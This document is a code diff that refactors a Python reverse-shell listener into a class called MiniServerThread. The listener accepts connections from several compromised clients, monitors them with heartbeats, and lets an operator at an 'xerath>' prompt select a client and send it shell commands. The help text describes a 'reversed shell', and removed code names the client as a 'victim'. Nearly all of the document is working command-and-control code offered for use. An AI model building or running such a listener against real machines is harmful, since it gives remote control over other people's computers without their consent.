@@ -1,21 +1,11 @@
 import socket
-import sys
 import threading
 import time
 from queue import Queue
 from collections import defaultdict
-NUMBER_OF_THREADS = 3
-JOB_NUMBER = [1, 2, 3]
-queue = Queue()
-all_connections = {}
-hb_connections = {}
+from args import get_args
 
-port = int(sys.argv[1])
-hb_rate = 1
-max_failure = 5
-# Create a Socket ( connect two computers)
-
-help_info = ' ----------------------------------------------------------------\n' \
+HELP_INFO = ' ----------------------------------------------------------------\n' \
             '|Help info: use below commands to find clients or control        |\n' \
             '|list: display connected client and address                      |\n' \
             '|select <client id>: select client and return the reversed shell |\n' \
@@ -23,200 +13,189 @@ help_info = ' ----------------------------------------------------------------\n
             '|exit: log out remote client shell                               |\n' \
             ' ----------------------------------------------------------------\n'
 
-def create_socket():
-    try:
-        global host
-        global port
-        global s
-        host = ""
-        port = port if port else 8091
-        s = socket.socket()
-    except socket.error as msg:
-        print("Socket creation error: " + str(msg))
+class MiniServerThread:
+    def __init__(self, port, host="", thread=3, hb_rate=1, max_failure=5, help_info=HELP_INFO ):
+        self.number_of_threads = thread
+        self.job_number = list(range(1,thread+1))
+        self.queue = Queue()
+        self.all_connections = {}
+        self.hb_connections = {}
+        self.port = port
+        self.hb_rate = hb_rate
+        self.max_failure = max_failure
+        self.info = help_info
+        self.retry = 5
+        self.host = host
 
-
-# Binding the socket and listening for connections
-def bind_socket():
-    try:
-        global host
-        global port
-        global s
-        print("Binding the Port: " + str(port))
-
-        s.bind((host, port))
-        s.listen(5)
-
-    except socket.error as msg:
-        print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
-        bind_socket()
-
-
-# Handling connection from multiple clients and saving to a list
-# Closing previous connections when server.py file is restarted
-
-def clear_all():
-    for i, (_, _) in all_connections.items():
-        clear_connection(i)
-
-    for i, (_, _) in hb_connections.items():
-        clear_connection(i)
-
-
-def accepting_connections():
-    # close shell connections
-    clear_all()
-
-    while True:
+    def create_socket(self):
         try:
-            conn, address = s.accept()
-            s.setblocking(1)  # prevents timeout
-        except:
-            print("Error accepting connections")
+            self.s = socket.socket()
+        except socket.error as msg:
+            print("Socket creation error: " + str(msg))
 
-        data = None
+    def bind_socket(self):
         try:
-            data = conn.recv(1024)
-        except:
-            print("error in receiving data")
-        # empty for shell process, else for hb
-        if data == b' ':
-            new_client = max(all_connections) + 1 if all_connections else 0
-            all_connections[new_client] = (conn, address)
-            print("Connection has been established :" + address[0], address[1], flush=True)
-            print(help_info)
+            print("Started server, binding the Port: " + str(self.port))
+            self.s.bind((self.host, self.port))
+            self.s.listen(self.retry)
+        except socket.error as msg:
+            print("Socket Binding error" + str(msg) + "\n" + "Retrying...")
+            self.bind_socket()
 
-        else:
-            new_client = max(hb_connections) + 1 if hb_connections else 0
-            hb_connections[new_client] = (conn, address)
+    def clear_all(self):
+        for i, (_, _) in self.all_connections.items():
+            self.clear_connection(i)
 
+        for i, (_, _) in self.hb_connections.items():
+            self.clear_connection(i)
 
-def start_turtle():
-
-    while True:
-        cmd = input('turtle> ')
-        if cmd == 'list':
-            list_connections()
-        elif 'select' in cmd:
-            conn = get_target(cmd)
-            if conn is not None:
-                send_target_commands(conn)
-        elif 'heartbeat' in cmd:
-            show_client_daemon()
-        elif cmd =='':
-            continue
-        else:
-            print("Command not recognized")
-
-
-def show_client_daemon():
-    for i, (conn, address) in hb_connections.items():
-        results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
-        print("----Clients----" + "\n" + results)
-
-
-def hb_test():
-    hb_failures = defaultdict(int)
-    while True:
-        time.sleep(hb_rate)
-        hb_keys = list(hb_connections.keys())
-        for i in hb_keys:
+    def accepting_connections(self):
+        # close shell connections
+        self.clear_all()
+        while True:
             try:
-                hb_connections[i][0].send(str.encode(' '))
+                conn, address = self.s.accept()
+                self.s.setblocking(1)  # prevents timeout
             except:
-                hb_failures[i] += 1
-            if hb_failures[i] > max_failure:
-                msg = "client {} no response for {}s "
-                print(msg.format(i, hb_failures[i] * hb_rate ))
-                print("disconnect client", i, end='\n')
-                clear_connection(i)
-                hb_failures[i] = 0
+                print("Error accepting connections")
+            data = None
+            try:
+                # Two processes both send some initial info to tell if it's daemon or not
+                data = conn.recv(1024)
+            except:
+                print("error in receiving data")
+            # empty for shell process, else for heart beat
+            if data == b' ':
+                new_client = max(self.all_connections) + 1 if self.all_connections else 0
+                self.all_connections[new_client] = (conn, address)
+                print("Connection has been established :" + address[0], address[1], flush=True)
+                print(self.info)
+            else:
+                new_client = max(self.hb_connections) + 1 if self.hb_connections else 0
+                self.hb_connections[new_client] = (conn, address)
 
+    def start_xerath(self):
+        while True:
+            cmd = input('xerath> ')
+            if cmd == 'list':
+                self.list_connections()
+            elif 'select' in cmd:
+                conn = self.get_target(cmd)
+                if conn is not None:
+                    self.send_target_commands(conn)
+            elif 'heartbeat' in cmd:
+                self.show_client_daemon()
+            elif cmd =='':
+                continue
+            else:
+                print("Command not recognized")
 
-# Display all current active connections with client
-def clear_connection(i):
-    all_connections[i][0].close()
-    del all_connections[i]
-    hb_connections[i][0].close()
-    del hb_connections[i]
+    def show_client_daemon(self):
+        for i, (conn, address) in self.hb_connections.items():
+            results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
+            print("----Clients----" + "\n" + results)
 
-def list_connections():
-    to_remove = []
-    for i, (conn, address) in all_connections.items():
+    def heart_beat(self):
+        hb_failures = defaultdict(int)
+        print_true = True
+        while True:
+            if self.hb_connections and print_true:
+                print("Start monitoring client connection in daemon..")
+                print_true = False
+            time.sleep(self.hb_rate)
+            hb_keys = list(self.hb_connections.keys())
+            for i in hb_keys:
+                try:
+                    self.hb_connections[i][0].send(str.encode(' '))
+                except:
+                    hb_failures[i] += 1
+                if hb_failures[i] > self.max_failure:
+                    msg = "\nclient {}: no response for {}s "
+                    print(msg.format(i, hb_failures[i] * self.hb_rate ))
+                    print("disconnect client", i, end='\n')
+                    self.clear_connection(i)
+                    hb_failures[i] = 0
+
+    def clear_connection(self, i):
+        self.all_connections[i][0].close()
+        del self.all_connections[i]
+        self.hb_connections[i][0].close()
+        del self.hb_connections[i]
+
+    def list_connections(self):
+        to_remove = []
+        for i, (conn, address) in self.all_connections.items():
+            try:
+                conn.send(str.encode(' '))
+                conn.recv(20480)
+            except:
+                to_remove.append(i)
+                continue
+            results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
+            print("----Clients----\n{}".format(results))
+        for i in to_remove:
+            self.clear_connection(i)
+
+    # Selecting the target
+    def get_target(self, cmd):
         try:
-            conn.send(str.encode(' '))
-            conn.recv(20480)
+            target = cmd.replace('select ', '')  # target = id
+            target = int(target)
+            conn, address = self.all_connections[target]
+            print("You are now connected to :" + str(address[0]))
+            print(str(address[0]) + ">", end="")
+            return conn
         except:
-            to_remove.append(i)
-            continue
-        results = str(i) + "   " + str(address[0]) + "   " + str(address[1]) + "\n"
-        print("----Clients----" + "\n" + results)
-    for i in to_remove:
-        clear_connection(i)
+            print("Selection not valid")
+            return None
 
-# Selecting the target
-def get_target(cmd):
-    try:
-        target = cmd.replace('select ', '')  # target = id
-        target = int(target)
-        conn, address = all_connections[target]
-        print("You are now connected to :" + str(address[0]))
-        print(str(address[0]) + ">", end="")
-        return conn
-        # 192.168.0.4> dir
-
-    except:
-        print("Selection not valid")
-        return None
-
-
-# Send commands to client/victim or a friend
-def send_target_commands(conn):
-    while True:
-        try:
-            cmd = input()
-            if cmd == 'exit':
+    @staticmethod
+    def send_target_commands(conn):
+        while True:
+            try:
+                cmd = input()
+                if cmd == 'exit':
+                    break
+                if len(str.encode(cmd)) > 0:
+                    conn.send(str.encode(cmd))
+                    client_response = str(conn.recv(20480), "utf-8")
+                    print(client_response, end="")
+            except:
+                print("Error sending commands")
                 break
-            if len(str.encode(cmd)) > 0:
-                conn.send(str.encode(cmd))
-                client_response = str(conn.recv(20480), "utf-8")
-                print(client_response, end="")
-        except:
-            print("Error sending commands")
-            break
+
+    def create_workers(self):
+        for _ in range(self.number_of_threads):
+            t = threading.Thread(target=self.work)
+            # set worker as daemon; daemon terminates after main ends
+            t.setDaemon(True)
+            t.start()
+
+    def work(self):
+        while True:
+            x = self.queue.get()
+            if x == 1:
+                self.create_socket()
+                self.bind_socket()
+                self.accepting_connections()
+            if x == 2:
+                self.start_xerath()
+            if x == 3:
+                self.heart_beat()
+            self.queue.task_done()
+
+    def create_jobs(self):
+        for x in self.job_number:
+            self.queue.put(x)
+        self.queue.join()
 
 
-# Create worker threads
-def create_workers():
-    for _ in range(NUMBER_OF_THREADS):
-        t = threading.Thread(target=work)
-        # set worker as daemon; daemon terminates after main ends
-        t.setDaemon(True)
-        t.start()
 
 
-# Do next job that is in the queue (handle connections, send commands)
-def work():
-    while True:
-        x = queue.get()
-        if x == 1:
-            create_socket()
-            bind_socket()
-            accepting_connections()
-        if x == 2:
-            start_turtle()
 
-        if x == 3:
-            hb_test()
+if __name__ == '__main__':
 
-        queue.task_done()
-
-
-def create_jobs():
-    for x in JOB_NUMBER:
-        queue.put(x)
-
-    queue.join()
-
-
-create_workers()
-create_jobs()
+    args = get_args()
+    server = MiniServerThread(port=args.port, host=args.host)
+    server.create_workers()
+    server.create_jobs()
